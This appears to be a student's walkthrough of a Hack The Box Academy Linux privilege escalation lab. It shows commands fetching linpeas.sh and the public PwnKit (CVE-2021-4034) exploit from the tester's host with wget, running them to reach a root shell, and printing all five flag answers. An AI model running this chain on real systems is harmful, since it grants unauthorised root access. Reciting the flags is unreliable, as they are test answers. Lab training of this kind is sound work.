@@ -1,1 +1,89 @@
+We have been contracted to perform a security hardening assessment against one of the INLANEFREIGHT organizations' public-facing web servers.
 
+The client has provided us with a low privileged user to assess the security of the server. Connect via SSH and begin looking for misconfigurations and other flaws that may escalate privileges using the skills learned throughout this module.
+
+Once on the host, we must find five flags on the host, accessible at various privilege levels. Escalate privileges all the way from the htb-student user to the root user and submit all five flags to finish this module.
+
+Note: There is a way to obtain a shell on the box instead of using the SSH credentials if you would like to make the scenario more challenging. This is optional and does not award more points or count towards completion.
+
+
+CHALLENGE: 
+
+
+Question 1 - Submit the contents of flag1.txt
+1. https://github.com/peass-ng/PEASS-ng/releases/tag/20250301-c97fb02a
+2. download to host and then python3 -m http.server 
+3. on ssh session -> wget http://10.10.15.252:8000/linpeas.sh 
+4. on ssh session chmod +x linpeas.sh 
+5./linpeas.sh 
+6. part of output -> [CVE-2021-4034] PwnKit
+
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: probable
+   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+7. repeat the steps above but with pwnkit -> curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
+then wget to ssh and chmod 
+8. wget http://10.10.15.252:8000/PwnKit
+--2025-03-17 19:54:54--  http://10.10.15.252:8000/PwnKit
+Connecting to 10.10.15.252:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 18040 (18K) [application/octet-stream]
+Saving to: ‘PwnKit’
+
+PwnKit              100%[===================>]  17.62K  --.-KB/s    in 0.01s   
+
+2025-03-17 19:54:54 (1.81 MB/s) - ‘PwnKit’ saved [18040/18040]
+
+htb-student@nix03:~$ chmod +x PwnKit 
+htb-student@nix03:~$ ./PwnKit 
+root@nix03:/home/htb-student# ls
+PwnKit  linpeas.sh  pwnkit.c  snap
+root@nix03:/home/htb-student# cd ..
+root@nix03:/home# 
+
+9. we see we are now root. ggwp. lets enumerate for flags. 
+10. root@nix03:/home/mrb3n# cd ..
+root@nix03:/home# cd barry/
+root@nix03:/home/barry# ls
+flag2.txt
+root@nix03:/home/barry# cat flag2.txt 
+LLPE{ch3ck_th0se_cmd_l1nes!}
+root@nix03:/home/barry# 
+
+
+11. So now that we know the flags start with LLPE we can just search for that in all directories and find all the flags. 
+12. grep -Irl "LLPE{" / 2>/dev/null
+`-I ignores binary files, -r does it recursively and -l gives us the name of the file it was found in`
+13. root@nix03:/home/barry# grep -Irl "LLPE{" / 2>/dev/null
+/home/htb-student/.config/.flag1.txt
+/home/barry/flag2.txt
+/var/log/flag3.txt
+/var/lib/tomcat9/flag4.txt
+/root/flag5.txt
+root@nix03:/home/barry# 
+ 14. root@nix03:/home/barry# cat /home/htb-student/.config/.flag1.txt
+LLPE{d0n_ov3rl00k_h1dden_f1les!}
+
+
+
+Question 2 - Submit the contents of flag2.txt
+1. steps above 
+2. from steps above
+3. root@nix03:/home/barry# cat flag2.txt 
+LLPE{ch3ck_th0se_cmd_l1nes!}
+
+Question 3 - Submit the contents of flag3.txt
+1. steps in Questuion 1 
+2. root@nix03:/home/barry# cat /var/log/flag3.txt
+LLPE{h3y_l00k_a_fl@g!}
+
+Question 4 - Submit the contents of flag4.txt
+1. steps in question 1 
+2. root@nix03:/home/barry# cat /var/lib/tomcat9/flag4.txt
+LLPE{im_th3_m@nag3r_n0w}
+
+Question 5 - Submit the contents of flag5.txt
+1. steps in question 1 
+2. root@nix03:/home/barry# cat /root/flag5.txt
+LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
